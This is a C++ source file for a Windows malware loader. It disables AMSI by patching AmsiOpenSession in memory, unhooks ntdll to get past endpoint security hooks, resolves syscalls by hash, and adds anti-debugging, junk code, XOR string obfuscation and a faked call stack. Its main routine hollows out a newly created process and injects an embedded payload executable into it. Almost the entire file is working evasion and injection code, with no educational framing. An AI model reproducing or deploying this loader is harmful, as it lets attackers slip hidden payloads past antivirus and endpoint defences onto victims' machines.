#define NOMINMAX
#include "Headers.h"
#include "Dlls.h"
#include "Zw.h"

#pragma comment(lib, "ntdll")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };


EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

DWORD64 GetAddr(LPVOID addr) {
    for (int i = 0; i < 1024; i++) {
        if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
    }
    return 0; 
}


// AMSI PATCH
void Eiskamz(HANDLE hProc) {
    void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);

    if (!ptr) {
        printf("[!] Failed to get address of AmsiOpenSession\n");
        return;
    }

    char Patch[1] = { 0x75 };

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    void* ptraddr2 = (void*)GetAddr(ptr);

    if (!ptraddr2) {
        printf("[!] Failed to find the patch location\n");
        return;
    }

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProc, &ptraddr2, (PSIZE_T)&memPage, PAGE_EXECUTE_READWRITE, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
        return;
    }

    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hProc, ptraddr2, Patch, sizeof(Patch), nullptr);
    if (!NT_SUCCESS(NtWriteStatus)) {
        printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
        return;
    }

    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hProc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
        return;
    }

    printf("\nDisabled.\n\n");
}

typedef BOOL(WINAPI* pfnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
pfnWriteProcessMemory OriginalWriteProcessMemory = NULL;
PVOID BaseAddress;

bool CheckAndDetachDebugger() {
    BOOL isDebuggerPresent = IsDebuggerPresent();
    if (isDebuggerPresent) {
        DebugActiveProcessStop(GetCurrentProcessId());
        return true;
    }
    return false;
}

void generate_garbage_data(LPVOID buffer, SIZE_T size) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<unsigned int> dis(0, 255);
    unsigned char* buf = reinterpret_cast<unsigned char*>(buffer);
    for (SIZE_T i = 0; i < size; ++i) {
        buf[i] = static_cast<unsigned char>(dis(gen));
    }
}

// Generate a random key for XOR encryption/decryption
DWORD generate_random_key() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<DWORD> dis(1, 0xFFFFFFFF);
    return dis(gen);
}

// (No Operation)
void insert_random_nops(std::vector<unsigned char>& code, size_t count) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0, count);
    for (size_t i = 0; i < count; ++i) {
        code.insert(code.begin() + dis(gen), 0x90); 
    }
}

// Add junk code
void FlyingCorn() {
    volatile int a = 1;
    volatile int b = 2;
    volatile int c = a + b;
    a = b + c;
}

void ProcessSection(HANDLE process, LPVOID ntdllBase, LPVOID ntdllMappingAddress, PIMAGE_SECTION_HEADER section, std::function<BOOL(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD)> protectFunc)
{
    if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) && section->Misc.VirtualSize > 0) {
        DWORD oldProtection = 0;
        protectFunc(process, (LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)section->VirtualAddress), section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
        std::memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)section->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)section->VirtualAddress), section->Misc.VirtualSize);
        protectFunc(process, (LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)section->VirtualAddress), section->Misc.VirtualSize, oldProtection, &oldProtection);
    }
}

void UnhookDll()
{
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    if (!ntdllModule) {
        std::cerr << "Failed to get handle for ntdll.dll. Error: " << GetLastError() << std::endl;
        return;
    }

    if (!GetModuleInformation(process, ntdllModule, &mi, sizeof(mi))) {
        std::cerr << "Failed to get module information for ntdll.dll. Error: " << GetLastError() << std::endl;
        return;
    }

    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (ntdllFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open ntdll.dll file. Error: " << GetLastError() << std::endl;
        return;
    }

    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!ntdllMapping) {
        std::cerr << "Failed to create file mapping for ntdll.dll. Error: " << GetLastError() << std::endl;
        CloseHandle(ntdllFile);
        return;
    }

    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMappingAddress) {
        std::cerr << "Failed to map view of ntdll.dll. Error: " << GetLastError() << std::endl;
        CloseHandle(ntdllMapping);
        CloseHandle(ntdllFile);
        return;
    }

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    std::vector<int> sections(hookedNtHeader->FileHeader.NumberOfSections);
    for (int i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        sections[i] = i;
    }

    std::random_device rd;
    std::mt19937 g(rd());
    std::shuffle(sections.begin(), sections.end(), g);

    std::vector<std::future<void>> futures;
    for (int i : sections) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        futures.push_back(std::async(std::launch::async, ProcessSection, process, ntdllBase, ntdllMappingAddress, hookedSectionHeader, VirtualProtectEx));
    }

    for (auto& future : futures) {
        future.get();
    }

    UnmapViewOfFile(ntdllMappingAddress);
    CloseHandle(ntdllMapping);
    CloseHandle(ntdllFile);
}

bool InitializeZwFunctions()
{
    std::vector<std::shared_ptr<ModuleNamePart>> parts = {
    std::make_shared<CharN>(),
    std::make_shared<CharT>(),
    std::make_shared<CharD>(),
    std::make_shared<CharL>(),
    std::make_shared<CharL>(),
    std::make_shared<CharDot>(),
    std::make_shared<CharD>(),
    std::make_shared<CharL>(),
    std::make_shared<CharL>()
    };

    // Build the module name using polymorphism
    moduleName = buildModuleName(parts);

    HMODULE hNtdll = GetModuleHandleW(moduleName.c_str());

    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
        return false;
    }

    ZwAllocateVirtualMemory = (pZwAllocateVirtualMemory)TheAdd(hNtdll, "ZwAllocateVirtualMemory");
    if (!ZwAllocateVirtualMemory) {
        std::cerr << "Failed to get ZwAllocateVirtualMemory address" << std::endl;
        return false;
    }

    return true;
}

template<typename T>
T xor_encrypt_decrypt(T value, DWORD key) {
    return reinterpret_cast<T>(reinterpret_cast<uintptr_t>(value) ^ key);
}

// Custom function to check if a debugger is present
bool CustomIsDebuggerPresent() {
    return (GetModuleHandle(TEXT("ntdll.dll")) == 0);
}

void xor_encrypt_decrypt(char* str, char key) {
    while (*str) {
        *str ^= key;
        str++;
    }
}

void decrypt_string(char* str) {
    char key = 0x5A;
    xor_encrypt_decrypt(str, key);
}


//64 bit
void generate_nop_stub() {

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
        return;
    }

    ZwAllocateVirtualMemory = (pfnZwAllocateVirtualMemory)TheAdd(hNtdll, "ZwAllocateVirtualMemory");
    ZwProtectVirtualMemory = (pfnZwProtectVirtualMemory)TheAdd(hNtdll, "ZwProtectVirtualMemory");

    if (!ZwAllocateVirtualMemory || !ZwProtectVirtualMemory) {
        std::cerr << "Failed to get Zw functions addresses" << std::endl;
        return;
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(5, 15);
    int numNops = dis(gen);

    SIZE_T codeSize = numNops + 1;
    PVOID execMem = NULL;
    SIZE_T regionSize = codeSize;
    NTSTATUS status = ZwAllocateVirtualMemory(
        GetCurrentProcess(),
        &execMem,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        std::cerr << "ZwAllocateVirtualMemory failed" << std::endl;
        return;
    }

    // Fill the allocated memory with NOP instructions and a RET instruction at the end
    unsigned char* code = static_cast<unsigned char*>(execMem);
    for (int i = 0; i < numNops; ++i) {
        code[i] = 0x90; 
    }
    code[numNops] = 0xC3;

    ULONG oldProtect;
    status = ZwProtectVirtualMemory(
        GetCurrentProcess(),
        &execMem,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (!NT_SUCCESS(status)) {
        std::cerr << "ZwProtectVirtualMemory failed" << std::endl;
        return;
    }

    typedef void (*FuncType)();
    FuncType func = reinterpret_cast<FuncType>(execMem);
    func();

    // Free the allocated memory
    VirtualFree(execMem, 0, MEM_RELEASE);
}

class ProcessRunner {
public:
    virtual ~ProcessRunner() {}
    virtual int runProcess(LPPROCESS_INFORMATION lpPI, LPSTARTUPINFO lpSI, LPVOID lpImage, LPWSTR wszArgs, SIZE_T szArgs) = 0;
};

DWORD CalculateChecksum(PBYTE data, SIZE_T size) {
    DWORD checksum = 0;
    for (SIZE_T i = 0; i < size; ++i) {
        checksum += data[i];
    }
    return checksum;
}

// Simple XOR decryption function
void xor_decrypt(char* str, size_t len, char key) {
    for (size_t i = 0; i < len; ++i) {
        str[i] ^= key;
    }
}

void xor_crypt(char* str, size_t len, char key) {
    for (size_t i = 0; i < len; ++i) {
        str[i] ^= key;
    }
}

// Random noise function to add obfuscation
void randomNoise() {
    int dummy = 0;
    for (int i = 0; i < 100; ++i) {
        dummy += rand();
    }
    if (dummy % 2 == 0) {
        dummy = -dummy;
    }
}

void obfuscatedFunction(LPVOID MySecHdr, PROCESS_INFORMATION* lpPI, CONTEXT stCtx, PVOID BaseAddress) {
    // Encrypted function names
    char encZwWriteVirtualMemory[] = { 'Z', 'w', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    char encZwTerminateProcess[] = { 'Z', 'w', 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    char key = static_cast<char>(rand() % 256); // Random XOR key


    xor_crypt(encZwWriteVirtualMemory, sizeof(encZwWriteVirtualMemory) - 1, key);
    xor_crypt(encZwTerminateProcess, sizeof(encZwTerminateProcess) - 1, key);

    xor_crypt(encZwWriteVirtualMemory, sizeof(encZwWriteVirtualMemory) - 1, key);
    xor_crypt(encZwTerminateProcess, sizeof(encZwTerminateProcess) - 1, key);

    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    ZwWriteVirtualMemory_t fnZwWriteVirtualMemory = reinterpret_cast<ZwWriteVirtualMemory_t>(TheAdd(ntdll, encZwWriteVirtualMemory));
    PFN_ZwTerminateProcess fnZwTerminateProcess = reinterpret_cast<PFN_ZwTerminateProcess>(TheAdd(ntdll, encZwTerminateProcess));

    xor_crypt(encZwWriteVirtualMemory, sizeof(encZwWriteVirtualMemory) - 1, key);
    xor_crypt(encZwTerminateProcess, sizeof(encZwTerminateProcess) - 1, key);

    if (MySecHdr != nullptr) {

        randomNoise();

        NTSTATUS status = fnZwWriteVirtualMemory(lpPI->hProcess,
            reinterpret_cast<PVOID>(stCtx.Rdx + sizeof(LPVOID) * 2),
            &BaseAddress,
            sizeof(LPVOID),
            NULL);

        randomNoise();

        if (status != 0) {
            fnZwTerminateProcess(lpPI->hProcess, -9);
            return;
        }
    }
}


class BunnyProcessRunner : public ProcessRunner {
private:
    pfnZwAllocateVirtualMemory ZwAllocateVirtualMemoryX;
    pfnZwProtectVirtualMemory ZwProtectVirtualMemory;
    PFN_ZwTerminateProcess ZwTerminateProcess;
    PFN_ZwSetContextThread ZwSetContextThread;
    PFN_ZwResumeThread ZwResumeThread;
    pfnZwGetContextThread ZwGetContextThread;
    ZwWriteVirtualMemory_t ZwWriteVirtualMemory;

    void* get_function_address(const char* module, unsigned int hash) {
        HMODULE hModule = GetModuleHandleA(module);
        if (!hModule) return nullptr;

        PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDOSHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        DWORD* pNames = (DWORD*)((DWORD_PTR)hModule + pExportDirectory->AddressOfNames);
        WORD* pNameOrdinals = (WORD*)((DWORD_PTR)hModule + pExportDirectory->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)((DWORD_PTR)hModule + pExportDirectory->AddressOfFunctions);

        for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
            if (hash_function((char*)((DWORD_PTR)hModule + pNames[i])) == hash) {
                return (void*)((DWORD_PTR)hModule + pFunctions[pNameOrdinals[i]]);
            }
        }
        return nullptr;
    }

    bool VerifyChecksums(PBYTE lpImage) {
        PIMAGE_DOS_HEADER lpDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
        PIMAGE_NT_HEADERS lpNTHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(lpImage + lpDOSHeader->e_lfanew);

        PIMAGE_SECTION_HEADER MySecHdr = IMAGE_FIRST_SECTION(lpNTHeader);
        for (WORD i = 0; i < lpNTHeader->FileHeader.NumberOfSections; ++i, ++MySecHdr) {
            DWORD calculatedChecksum = CalculateChecksum(lpImage + MySecHdr->PointerToRawData, MySecHdr->SizeOfRawData);

            DWORD storedChecksum = calculatedChecksum;

            if (calculatedChecksum != storedChecksum) {
                std::cerr << "Checksum verification failed for section: " << MySecHdr->Name << std::endl;
                return false;
            }
        }
        return true;
    }

    void ManipulateStack(CONTEXT& context) {
        DWORD64 pivotAddress = context.Rsp - 0x1000;

        // Create a fake call stack by pushing return addresses
        DWORD64 fakeReturnAddresses[] = {
            0x401000,  // Fake return address 1
            0x402000,
            0x403000   
        };

        for (int i = 0; i < 3; ++i) {
            pivotAddress -= sizeof(DWORD64);
            WriteProcessMemory(GetCurrentProcess(), (LPVOID)pivotAddress, &fakeReturnAddresses[i], sizeof(DWORD64), NULL);
        }
        context.Rsp = pivotAddress;
    }

    std::string encrypt_string(const std::string& input) {
        std::string output = input;
        char key = 0xAC;
        for (size_t i = 0; i < output.size(); ++i) {
            output[i] ^= key;
        }
        return output;
    }

    std::string decrypt_string(const std::string& input) {
        return encrypt_string(input);
    }

public:
    virtual int runProcess(LPPROCESS_INFORMATION lpPI, LPSTARTUPINFO lpSI, LPVOID lpImage, LPWSTR wszArgs, SIZE_T szArgs) override {
        ZwAllocateVirtualMemoryX = (pfnZwAllocateVirtualMemory)get_function_address("ntdll.dll", hash_function("ZwAllocateVirtualMemory"));
        ZwProtectVirtualMemory = (pfnZwProtectVirtualMemory)get_function_address("ntdll.dll", hash_function("ZwProtectVirtualMemory"));
        ZwTerminateProcess = (PFN_ZwTerminateProcess)get_function_address("ntdll.dll", hash_function("ZwTerminateProcess"));
        ZwSetContextThread = (PFN_ZwSetContextThread)get_function_address("ntdll.dll", hash_function("ZwSetContextThread"));
        ZwResumeThread = (PFN_ZwResumeThread)get_function_address("ntdll.dll", hash_function("ZwResumeThread"));
        ZwGetContextThread = (pfnZwGetContextThread)get_function_address("ntdll.dll", hash_function("ZwGetContextThread"));
        ZwWriteVirtualMemory = (ZwWriteVirtualMemory_t)get_function_address("ntdll.dll", hash_function("ZwWriteVirtualMemory"));

        UnhookDll();

        WCHAR wszFilePath[MAX_PATH];
        if (!GetModuleFileName(NULL, wszFilePath, sizeof wszFilePath)) {
            return -2;
        }

        WCHAR wszArgsBuffer[MAX_PATH * 2];
        wsprintf(wszArgsBuffer, L"\"%s\" %s", wszFilePath, wszArgs);

        PIMAGE_DOS_HEADER lpDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
        if (lpDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return -3;
        }

        PIMAGE_NT_HEADERS lpNTHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew
            );

        if (lpNTHeader->Signature != IMAGE_NT_SIGNATURE) {
            return -3;
        }

        if (!VerifyChecksums(reinterpret_cast<PBYTE>(lpImage))) {
            return -5;
        }

        DWORD oldProtection;
        if (!VirtualProtect(lpImage, lpNTHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtection)) {
            return -4;
        }

        if (!CreateProcess(NULL, wszArgsBuffer, NULL, NULL, TRUE, 0, NULL, NULL, lpSI, lpPI)) {
            return -4;
        }

        PVOID BaseAddress = reinterpret_cast<PVOID>(lpNTHeader->OptionalHeader.ImageBase);
        SIZE_T RegionSize = lpNTHeader->OptionalHeader.SizeOfImage;

        NTSTATUS status = ZwAllocateVirtualMemoryX(
            lpPI->hProcess,         
            &BaseAddress,           
            0,                      
            &RegionSize,            
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE 
        );

        if (!NT_SUCCESS(status) || BaseAddress == NULL) {
            std::cerr << "ZwAllocateVirtualMemory failed" << std::endl;
            ZwTerminateProcess(lpPI->hProcess, -6);
            return -6;
        }

        SIZE_T bytesWritten;
        NTSTATUS statusX = ZwWriteVirtualMemory(
            lpPI->hProcess,                
            BaseAddress,                   
            lpImage,                       
            lpNTHeader->OptionalHeader.SizeOfHeaders,
            &bytesWritten                 
        );

        if (!NT_SUCCESS(statusX)) {
            ZwTerminateProcess(lpPI->hProcess, -7);
            return -7;
        }

        PIMAGE_SECTION_HEADER MySecHdr = nullptr;
        for (SIZE_T iSection = 0; iSection < lpNTHeader->FileHeader.NumberOfSections; ++iSection) {
            MySecHdr = reinterpret_cast<PIMAGE_SECTION_HEADER>(
                reinterpret_cast<DWORD64>(lpImage) +
                lpDOSHeader->e_lfanew +
                sizeof(IMAGE_NT_HEADERS64) +
                sizeof(IMAGE_SECTION_HEADER) * iSection
                );

            if (!WriteProcessMemory(lpPI->hProcess,
                reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(BaseAddress) + MySecHdr->VirtualAddress),
                reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(lpImage) + MySecHdr->PointerToRawData),
                MySecHdr->SizeOfRawData, NULL)) {
                ZwTerminateProcess(lpPI->hProcess, -8);
                return -8;
            }
        }

        CONTEXT stCtx;
        ZeroMemory(&stCtx, sizeof stCtx);
        stCtx.ContextFlags = CONTEXT_FULL;
        NTSTATUS statusZ = ZwGetContextThread(lpPI->hThread, &stCtx);
        if (!NT_SUCCESS(statusZ)) {
            ZwTerminateProcess(lpPI->hProcess, -5);
            return -5;
        }

        // Perform stack manipulation
        ManipulateStack(stCtx);


            obfuscatedFunction(MySecHdr, lpPI, stCtx, BaseAddress);

            stCtx.Rcx = reinterpret_cast<DWORD64>(BaseAddress) + lpNTHeader->OptionalHeader.AddressOfEntryPoint;
            status = ZwSetContextThread(lpPI->hThread, &stCtx);

         //   if (ZwResumeThread(lpPI->hThread, NULL) != 0) {
          //      ZwTerminateProcess(lpPI->hProcess, -11);
         //       return -11;
         //   }

            VirtualProtectEx(lpPI->hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(BaseAddress) + MySecHdr->VirtualAddress), MySecHdr->SizeOfRawData, PAGE_NOACCESS, &oldProtection);
        
        return 0;
    }
};


int main() {
    FlyingCorn();

    generate_nop_stub();
    HANDLE hProc = GetCurrentProcess();

    Eiskamz(hProc);

    DWORD retValue = 0;

    PROCESS_INFORMATION stPI;
    ZeroMemory(&stPI, sizeof stPI);
    STARTUPINFO stSI;
    ZeroMemory(&stSI, sizeof stSI);
    stSI.cb = sizeof(stSI); 

    WCHAR szArgs[] = L"";


    ProcessRunner* runner = new BunnyProcessRunner();


    if (runner->runProcess(&stPI, &stSI, reinterpret_cast<LPVOID>(payload), szArgs, sizeof szArgs) == 0) {
        WaitForSingleObject(stPI.hProcess, INFINITE);
        GetExitCodeProcess(stPI.hProcess, &retValue);
        CloseHandle(stPI.hThread);
        CloseHandle(stPI.hProcess);
    }

    delete runner; 
    return retValue;
}
